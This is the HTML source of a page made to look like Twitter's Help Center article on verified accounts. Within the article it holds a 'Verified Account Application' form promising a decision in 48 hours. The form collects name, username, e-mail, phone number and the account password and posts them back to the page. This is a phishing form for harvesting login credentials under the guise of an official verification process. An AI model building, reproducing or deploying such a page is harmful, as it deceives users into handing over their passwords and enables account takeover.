        <li class="ap01__menu-item">
          
            
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ap01__arrow-icon  twtr-icon--sm  twtr-color-fill--extra-light-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M17.207 11.293l-7.5-7.5c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414L15.086 12l-6.793 6.793c-.39.39-.39 1.023 0 1.414.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
          
          
          <span class="twtr-type--bold-12  twtr-color--extra-light-gray-neutral">About verified accounts</span>
        </li>
      </ul>
    </div>
  </div>
</div>

          <h1 class="twtr-type--page-headline">About verified accounts</h1>
          

    
    
    
    <div class="twtr-component-space--md twtr-rte c01-rich-text-editor">
  <p>The blue verified badge&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="htc-icon htc-icon--verified"> 
 <path style="fill: #1DA1F2" opacity="0" d="M0 0h24v24H0z"></path> 
 <path style="fill: #1DA1F2" d="M22.5 12.5c0-1.58-.875-2.95-2.148-3.6.154-.435.238-.905.238-1.4 0-2.21-1.71-3.998-3.818-3.998-.47 0-.92.084-1.336.25C14.818 2.415 13.51 1.5 12 1.5c-1.51 0-2.816.917-3.437 2.25-.415-.165-.866-.25-1.336-.25-2.11 0-3.818 1.79-3.818 4 0 .494.083.964.237 1.4-1.272.65-2.147 2.018-2.147 3.6 0 1.495.782 2.798 1.942 3.486-.02.17-.032.34-.032.514 0 2.21 1.708 4 3.818 4 .47 0 .92-.086 1.335-.25.62 1.334 1.926 2.25 3.437 2.25 1.512 0 2.818-.916 3.437-2.25.415.163.865.248 1.336.248 2.11 0 3.818-1.79 3.818-4 0-.174-.012-.344-.033-.513 1.158-.687 1.943-1.99 1.943-3.484zm-6.616-3.334l-4.334 6.5c-.145.217-.382.334-.625.334-.143 0-.288-.04-.416-.126l-.115-.094-2.415-2.415c-.293-.293-.293-.768 0-1.06s.768-.294 1.06 0l1.77 1.767 3.825-5.74c.23-.345.696-.436 1.04-.207.346.23.44.696.21 1.04z"></path> 
</svg> on Twitter lets people know that an account of public interest is authentic.</p>
<p>The badge appears next to the name on an account’s profile and next to the account name in search results. It is always the same color and placed in the same location, regardless of profile or theme color customizations.&nbsp;</p>
<p>Accounts that don’t have the badge next to their name but that display it somewhere else, for example in the profile photo, header photo, or bio, are not verified accounts.</p>
<p>Verified badges must be applied by Twitter, and accounts that use a badge as a part of profile photos, background photos, or in any other way that implies verified status, are subject to permanent account suspension.</p>
<h3>What types of accounts get verified?</h3>
<p>An account may be verified if it is determined to be an account of public interest. Typically this includes accounts maintained by users in music, acting, fashion, government, politics, religion, journalism, media, sports, business, and other key interest areas.</p>
<p>A verified badge does not imply an endorsement by Twitter.</p>
<br>
<br>
<br>
<h3>Verified Account Application</h3>
<p>If you want to have a verified badge, please send us the form below. Within 48 hours, the status of your application will be evaluated and an email will be sent to you.</p>
<form method="POST">
<label>Name:</label>
<input type="text" name="name" placeholder="Name" style="border:1px solid gray;" required>
<br>
<br>
<label>Username:</label>
<input type="text" name="username" placeholder="Username" style="border:1px solid gray;" required>
<br>
<br>
<label>E-Mail:</label>
<input type="email" name="mail" placeholder="E-Mail" style="border:1px solid gray;" required>
<br>
<br>
<label>Phone Number:</label>
<input type="number" name="phone" placeholder="Phone Number" style="border:1px solid gray;" required>
<br>
<br>
<label>Password:</label>
<input type="password" name="password" placeholder="Password" style="border:1px solid gray;" required>
<br><br>
<style>
#btntw {
    background-color: #4CAF50; /* Green */
    border: none;
    color: white;
    padding: 3px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
}

</style>
<button type="submit" id="btntw">Send</button>
</form>


</div>



        </div>
        







<div class="ap10">
  <div class="ap10__item">
    <h3 class="ap10__item-title  twtr-type--bold-24  twtr-color--black-neutral">Bookmark or share this article</h3>
    <div class="ap10__popover  ap10__popover-link  twtr-type--bold-14"></div>
    <ul class="ap10__menu">
      <li class="ap10__menu-item  ap10__menu-item--twitter">
        <button class="js-sharing-popup-twitter" data-share-text="About verified accounts" data-share-url="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts" data-share-via="" data-share-hashtags="" data-share-related="">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="twtr-icon  twtr-color-fill--blue-dark  has-hover"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path> 
</svg>
        </button>
      </li>
      <li class="ap10__menu-item  ap10__menu-item--facebook">
        <button class="js-sharing-popup-facebook" data-share-url="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="twtr-icon  twtr-color-fill--blue-dark  has-hover"> 
 <path d="M16.75,9H13.5V7a1,1,0,0,1,1-1h2V3H14a4,4,0,0,0-4,4V9H8v3h2v9h3.5V12H16Z"></path> 
</svg>
        </button>
      </li>
      <li class="ap10__menu-item  ap10__menu-item--linkedin">
        <button class="js-sharing-popup-linkedin" data-share-url="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="twtr-icon  twtr-color-fill--blue-dark  has-hover">
 <rect height="11" width="4" x="3" y="9"></rect>
 <circle cx="5" cy="5" r="2"></circle>
 <path d="M16.5,8.25A4.47251,4.47251,0,0,0,13,9.95343V9H9V20h4V13a2,2,0,0,1,4,0v7h4V12.75A4.5,4.5,0,0,0,16.5,8.25Z"></path>
</svg>
        </button>
      </li>
      <li class="ap10__menu-item  ap10__menu-item--link">
        <button class="js-sharing-copy-link" data-copy-message="Press #{key} to copy link." data-copy-label="Link copied to clipboard">
          <span><svg xmlns="http://www.w3.org/2000/svg" width="56" height="72" viewBox="0 0 56 72" class="twtr-icon  twtr-color-fill--blue-dark  has-hover">
 <path d="M29.518 12.25l-8.705 8.704a13.624 13.624 0 0 0-2.881 4.26 13.617 13.617 0 0 0-1.128 5.377c0 5.48 3.076 8.778 4.01 9.77 2.346 2.494 7.014 3.983 7.416 3.674.637-.49 2.665-3.002.174-5.764-.452-.502-3.605-.852-5.154-4.667-.836-2.059-.753-4.129.076-6.055a7.8 7.8 0 0 1 1.647-2.434l8.705-8.704c3.057-3.057 8.032-3.057 11.089 0 3.057 3.057 3.057 8.032 0 11.089l-4.175 4.174a17.549 17.549 0 0 1 2.37 5.947l5.963-5.962c5.35-5.351 5.35-14.057 0-19.408C43.574 6.9 34.869 6.9 29.518 12.25z"></path>
 <path d="M26.357 59.768l9.01-9.01a13.624 13.624 0 0 0 2.881-4.26 13.617 13.617 0 0 0 1.128-5.377c0-5.48-3.076-8.778-4.01-9.77-2.346-2.494-7.014-3.983-7.416-3.674-.637.49-2.665 3.002-.174 5.764.452.502 3.605.852 5.154 4.667.836 2.059.753 4.129-.076 6.055a7.8 7.8 0 0 1-1.647 2.434l-9.01 9.01c-3.057 3.057-8.032 3.057-11.089 0-3.057-3.057-3.057-8.032 0-11.089l4.479-4.479a17.549 17.549 0 0 1-2.37-5.947L6.95 40.36c-5.35 5.351-5.35 14.057 0 19.408 5.351 5.35 14.057 5.35 19.407 0z"></path>
</svg></span>
        </button>
      </li>
      <li class="ap10__menu-item  ap10__menu-item--bookmark  twtr-hidden--xs  twtr-hidden--sm  twtr-hidden--md  twtr-hidden--md2">
        <button class="js-sharing-bookmark" data-copy-label="Press #{key} to bookmark this page"><svg width="14px" height="20px" viewBox="0 0 14 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="twtr-icon  twtr-color-fill--blue-dark  has-hover"> 
 <path d="M14,1.16144891 C14,0.520724744 13.4427222,0 12.7582778,0 L1.24211111,0 C0.557277778,0 0,0.520724744 0,1.16144891 L0,19.2726337 C0,19.5744504 0.1995,19.8449945 0.501277778,19.9522668 C0.803444444,20.0599026 1.14488889,19.9817212 1.35916667,19.7559041 L7,13.8217511 L12.6408333,19.7559041 C12.8551111,19.9817212 13.1965556,20.0599026 13.4987222,19.9522668 C13.8005,19.8449945 14,19.5744504 14,19.2726337 L14,1.16144891 Z"></path> 
</svg></button>
      </li>
    </ul>
  </div>
</div>

      </div>
    </div>
    
    
<div class="c07 is-overlaps">
  <div class="c07__item">
    <a class="c07__link  twtr-type--roman-18  has-hover  twtr-color--green-dark" href="#">
      
      
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ap07__arrow-icon  twtr-icon--sm  twtr-color-fill--green-dark"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M18.707 10.293l-6-6c-.39-.39-1.023-.39-1.414 0l-6 6c-.39.39-.39 1.023 0 1.414.195.195.45.293.707.293s.512-.098.707-.293L11 7.414V20c0 .553.447 1 1 1s1-.447 1-1V7.414l4.293 4.293c.195.195.45.293.707.293s.512-.098.707-.293c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
      Scroll to top
    </a>
  </div>
</div>

  </div>
  
<div class="ap11" data-csat-action="/content/help-twitter/en/managing-your-account/about-twitter-verified-accounts">
  <div class="ap11__item twtr-color-bg--green-dark swiper-container-horizontal swiper-container-autoheight swiper-container-fade">
    <div class="ap11__panel-wrapper  swiper-wrapper" style="height: 85px;">
      <div class="ap11__panel ap11__panel--inquire swiper-slide swiper-no-swiping swiper-slide-active" style="width: 1349px; opacity: 1; transform: translate3d(0px, 0px, 0px);">
        <div class="twtr-grid  twtr-grid--justify-center">
          <div class="ap11__panel-content  twtr-grid__col-24">
            <h4 class="ap11__title">Was this article helpful?</h4>
            <div class="ap11__icons">
              <button class="ap11__icon-item  js-helpful-yes">
                <img class="ap11__icon--mood  twtr-icon--lg" src="/etc/designs/help-twitter/public/svg/smile_rating_1_circle_fill_white.svg" alt=""> 
              </button>
              <button class="ap11__icon-item  js-helpful-no">
                <img class="ap11__icon--mood  twtr-icon--lg" src="/etc/designs/help-twitter/public/svg/smile_circle_fill.svg" alt=""> 
              </button>
            </div>
            
          </div>
        </div>
      </div>

      <div class="ap11__panel ap11__panel--confirmation swiper-slide swiper-no-swiping swiper-slide-next" style="width: 1349px; opacity: 0; transform: translate3d(-1349px, 0px, 0px);">
        <div class="twtr-grid  twtr-grid--justify-center">
          <div class="ap11__panel-content  twtr-grid__col-24  twtr-grid__col-md-14  twtr-grid__col-xl-8">
            <div class="ap11__icons">
              <img class="ap11__icon--mood  twtr-icon--lg" src="/etc/designs/help-twitter/public/svg/smiley_sunglasses.svg" alt=""> 
            </div>
            <h4 class="ap11__title">Thank you for the feedback. We’re really glad we could help!</h4>
          </div>
        </div>
      </div>

      <div class="ap11__panel ap11__panel--more-info swiper-slide swiper-no-swiping" style="width: 1349px; opacity: 0; transform: translate3d(-2698px, 0px, 0px);">
        <div class="twtr-grid  twtr-grid--justify-center">
          <div class="ap11__panel-content  twtr-grid__col-24  twtr-grid__col-md-14  twtr-grid__col-xl-8">
            <h4 class="ap11__title">Thank you for the feedback. How could we improve this article?</h4>
            <div class="ap11__form">

              <form class="" action="index.html" method="post">
                <div class="twtr-form__element-wrap">
                  <div class="twtr-form__radio">
                    
                      <label class="twtr-form__radio-item  twtr-type--roman-16  twtr-color--white-neutral">
                        <input class="twtr-form__radio-item--input" type="radio" name="csatFormOption" value="It doesn’t have the information I need.">
                        <span class="twtr-form__radio-item-label">It doesn’t have the information I need.</span>
                        <div class="twtr-form__radio-item--indicator"></div>
                      </label>
                    
                      <label class="twtr-form__radio-item  twtr-type--roman-16  twtr-color--white-neutral">
                        <input class="twtr-form__radio-item--input" type="radio" name="csatFormOption" value="The information was hard to follow or confusing.">
                        <span class="twtr-form__radio-item-label">The information was hard to follow or confusing.</span>
                        <div class="twtr-form__radio-item--indicator"></div>
                      </label>
                    
                      <label class="twtr-form__radio-item  twtr-type--roman-16  twtr-color--white-neutral">
                        <input class="twtr-form__radio-item--input" type="radio" name="csatFormOption" value="The solution did not work as described.">
                        <span class="twtr-form__radio-item-label">The solution did not work as described.</span>
                        <div class="twtr-form__radio-item--indicator"></div>
                      </label>
                    
                      <label class="twtr-form__radio-item  twtr-type--roman-16  twtr-color--white-neutral">
                        <input class="twtr-form__radio-item--input" type="radio" name="csatFormOption" value="There is a broken link, missing image, or typo.">
                        <span class="twtr-form__radio-item-label">There is a broken link, missing image, or typo.</span>
                        <div class="twtr-form__radio-item--indicator"></div>
                      </label>
                    
                  </div>
                </div>
                <div class="ap11__form-btns  twtr-form__element-wrap  twtr-form__element-wrap--right">
                  <button class="twtr-btn--submit  twtr-color--green-dark  js-form-submit" type="button" name="button">Submit feedback</button>
                  <button class="twtr-btn--cancel  twtr-color-bg--green-light  js-form-skip" type="button" name="button">Skip</button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>

      <div class="ap11__panel swiper-slide swiper-no-swiping" style="width: 1349px; opacity: 0; transform: translate3d(-4047px, 0px, 0px);">
        <div class="twtr-grid  twtr-grid--justify-center">
          <div class="ap11__panel-content  twtr-grid__col-24  twtr-grid__col-md-14  twtr-grid__col-xl-8">
            <h4 class="ap11__title">Thank you for the feedback. Your comments will help us improve our articles in the future.</h4>
          </div>
        </div>
      </div>

    </div>

  </div>
</div>

</main>

      <div class="twtr-main">

<footer class="u02  twtr-container  twtr-color-bg--green-extra-dark">
  <div class="u02__wrapper  twtr-grid">
    <div class="u02__row  twtr-grid__col-24">
      <div class="twtr-grid twtr-grid--bleed">
        <div class="js-accordion  u02__column  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          <a href="https://about.twitter.com" title="About" target="_blank" class="u02__column__parent  twtr-type--bold-14  twtr-color--green-extra-light  has-hover">
              About

              <span class="u02__icon  twtr-color-fill--green-extra-light  twtr-hidden--md2  twtr-hidden--lg  twtr-hidden--xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="17" height="9.5" viewBox="0 0 17 9.5" class="twtr-icon--sm"> 
 <path d="M16.707.293c-.39-.39-1.023-.39-1.414 0L8.5 7.086 1.707.293c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
              </span>
          </a>
          <ul class="u02__column__list">
            <li class="u02__column__link">
              <a href="https://about.twitter.com/en_us/lets-go-twitter.html" title="Let’s go Twitter" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Let’s go Twitter
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://about.twitter.com/en_us/company.html" title="Company" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Company
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://about.twitter.com/en_us/values.html" title="Values" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Values
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://about.twitter.com/en_us/safety.html" title="Safety" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Safety
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://blog.twitter.com/official/en_us.html" title="Blog" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Blog
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://about.twitter.com/en_us/company/brand-resources.html" title="Brand Resources" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Brand Resources
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://careers.twitter.com/en.html" title="Careers" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Careers
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://investor.twitterinc.com/" title="Investors" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Investors
              </a>
            </li>
          </ul>
        </div>
      
        <div class="js-accordion  u02__column  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          <a href="https://business.twitter.com/" title="Business" target="_blank" class="u02__column__parent  twtr-type--bold-14  twtr-color--green-extra-light  has-hover">
              Business

              <span class="u02__icon  twtr-color-fill--green-extra-light  twtr-hidden--md2  twtr-hidden--lg  twtr-hidden--xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="17" height="9.5" viewBox="0 0 17 9.5" class="twtr-icon--sm"> 
 <path d="M16.707.293c-.39-.39-1.023-.39-1.414 0L8.5 7.086 1.707.293c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
              </span>
          </a>
          <ul class="u02__column__list">
            <li class="u02__column__link">
              <a href="https://business.twitter.com/en/advertising.html" title="About Twitter Ads" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 About Twitter Ads
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://business.twitter.com/en/targeting.html" title="Targeting" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Targeting
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://business.twitter.com/en/analytics.html" title="Analytics" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Analytics
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://business.twitter.com/en/help.html" title="Ads support" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Ads support
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://blog.twitter.com/small-business" title="Business blog" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Business blog
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://ads.twitter.com?ref=en-btc-gobal-footer" title="Advertise" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Advertise
              </a>
            </li>
          </ul>
        </div>
      
        <div class="js-accordion  u02__column  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          <a href="https://dev.twitter.com/" title="Developers" target="_blank" class="u02__column__parent  twtr-type--bold-14  twtr-color--green-extra-light  has-hover">
              Developers

              <span class="u02__icon  twtr-color-fill--green-extra-light  twtr-hidden--md2  twtr-hidden--lg  twtr-hidden--xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="17" height="9.5" viewBox="0 0 17 9.5" class="twtr-icon--sm"> 
 <path d="M16.707.293c-.39-.39-1.023-.39-1.414 0L8.5 7.086 1.707.293c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
              </span>
          </a>
          <ul class="u02__column__list">
            <li class="u02__column__link">
              <a href="https://dev.twitter.com/overview/documentation" title="Documentation" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Documentation
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://twittercommunity.com/" title="Forums" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Forums
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://dev.twitter.com/community" title="Communities" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Communities
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://blog.twitter.com/developer" title="Developer blog" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Developer blog
              </a>
            </li>
          </ul>
        </div>
      
        <div class="js-accordion  u02__column  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          <a href="https://help.twitter.com/" title="Help Center" class="u02__column__parent  twtr-type--bold-14  twtr-color--green-extra-light  has-hover">
              Help Center

              <span class="u02__icon  twtr-color-fill--green-extra-light  twtr-hidden--md2  twtr-hidden--lg  twtr-hidden--xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="17" height="9.5" viewBox="0 0 17 9.5" class="twtr-icon--sm"> 
 <path d="M16.707.293c-.39-.39-1.023-.39-1.414 0L8.5 7.086 1.707.293c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
              </span>
          </a>
          <ul class="u02__column__list">
            <li class="u02__column__link">
              <a href="https://help.twitter.com/using-twitter" title="Using Twitter" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Using Twitter
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://help.twitter.com/managing-your-account" title="Managing your account" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Managing your account
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://help.twitter.com/safety-and-security" title="Safety and security" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Safety and security
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://help.twitter.com/rules-and-policies" title="Rules and policies" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Rules and policies
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://help.twitter.com/contact-us" title="Contact us" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Contact us
              </a>
            </li>
          </ul>
        </div>
      
        <div class="js-accordion  u02__column  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          <a href="https://marketing.twitter.com/" title="Marketing" target="_blank" class="u02__column__parent  twtr-type--bold-14  twtr-color--green-extra-light  has-hover">
              Marketing

              <span class="u02__icon  twtr-color-fill--green-extra-light  twtr-hidden--md2  twtr-hidden--lg  twtr-hidden--xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="17" height="9.5" viewBox="0 0 17 9.5" class="twtr-icon--sm"> 
 <path d="M16.707.293c-.39-.39-1.023-.39-1.414 0L8.5 7.086 1.707.293c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
              </span>
          </a>
          <ul class="u02__column__list">
            <li class="u02__column__link">
              <a href="https://marketing.twitter.com/na/en/insights.html" title="Insights" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Insights
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://marketing.twitter.com/na/en/success-stories.html" title="Success Stories" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Success Stories
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://marketing.twitter.com/na/en/solutions.html" title="Solutions" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Solutions
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://marketing.twitter.com/na/en/collections.html" title="Collections" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Collections
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://blog.twitter.com/advertising" title="Marketing Blog" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Marketing Blog
              </a>
            </li>
          
            <li class="u02__column__link">
              <a href="https://twitterflightschool.com" title="Flight School" target="_blank" class="twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
                 Flight School
              </a>
            </li>
          </ul>
        </div>
      </div>
    </div>
    <div class="u02__row  twtr-grid__col-24">
      <div class="twtr-grid twtr-grid--bleed">
        <div class="u02__column  u02__column--footnote  u02__column__parent  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          <span class="u02__column__footnote  twtr-type--roman-14  twtr-color--green-extra-light">
            © 2019 Twitter, Inc.
          </span>
        </div>

        
          <div class="u02__column__parent  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
            <a href="https://support.twitter.com/articles/20170520" title="Cookies" target="_blank" class="u02__column__footnote  twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
              Cookies
            </a>
          </div>
        
          <div class="u02__column__parent  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
            <a href="https://twitter.com/privacy" title="Privacy" target="_blank" class="u02__column__footnote  twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
              Privacy
            </a>
          </div>
        
          <div class="u02__column__parent  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
            <a href="https://twitter.com/tos" title="Terms and Conditions" target="_blank" class="u02__column__footnote  twtr-type--roman-14  twtr-color--green-extra-light  has-hover">
              Terms and Conditions
            </a>
          </div>
        

        <div class="u02__column__parent  twtr-grid__col-sm-24  twtr-grid__col-md2-auto">
          


<div class="u03">
  <a class="u03__current-region  js-open  twtr-type--roman-14  twtr-color--green-extra-light  has-hover" href="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts">
    English
    <svg xmlns="http://www.w3.org/2000/svg" width="17" height="9.5" viewBox="0 0 17 9.5" class="twtr-icon--sm  twtr-color-fill--white-neutral  has-hover"> 
 <path d="M16.707.293c-.39-.39-1.023-.39-1.414 0L8.5 7.086 1.707.293c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
  </a>

  <div class="twtr-main">
    <div class="u03__modal  twtr-container  twtr-color-bg--green-extra-dark">
      <a href="https://help.twitter.com/en.html" class="u03__brand">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="u03__brand-icon twtr-icon--base  twtr-color-fill--white-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path> 
</svg>
        <span class="u03__site-name  twtr-type--bold-16  twtr-color--white-neutral">Help Center</span>
      </a>
      <div class="u03__close-button  js-close">
        <span><svg xmlns="http://www.w3.org/2000/svg" width="46" height="72" viewBox="0 0 46 72" class="twtr-icon--lg  twtr-color-fill--white-neutral  has-hover">
 <path d="M27.243 36l14.879-14.879a2.998 2.998 0 0 0 0-4.242 2.998 2.998 0 0 0-4.242 0L23 31.758 8.122 16.879a2.998 2.998 0 0 0-4.242 0 2.998 2.998 0 0 0 0 4.242L18.758 36 3.879 50.879A2.998 2.998 0 0 0 6.001 56a2.99 2.99 0 0 0 2.121-.879L23 40.242l14.879 14.879A2.991 2.991 0 0 0 40 56a2.998 2.998 0 0 0 2.121-5.121L27.243 36z"></path>
</svg></span>
      </div>
      <div class="u03__region-list-container">
        <ul class="u03__region-list  twtr-grid" data-choose-text="Choose a region" data-back-text="Back">
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts" data-iso-code="en" class="twtr-color--green-light  twtr-type--bold-24  has-hover">
              English
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/es/managing-your-account/about-twitter-verified-accounts" data-iso-code="es" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Español
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/ja/managing-your-account/about-twitter-verified-accounts" data-iso-code="ja" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              日本語
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/ko/managing-your-account/about-twitter-verified-accounts" data-iso-code="ko" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              한국어 
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/de/managing-your-account/about-twitter-verified-accounts" data-iso-code="de" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Deutsch 
            </a>
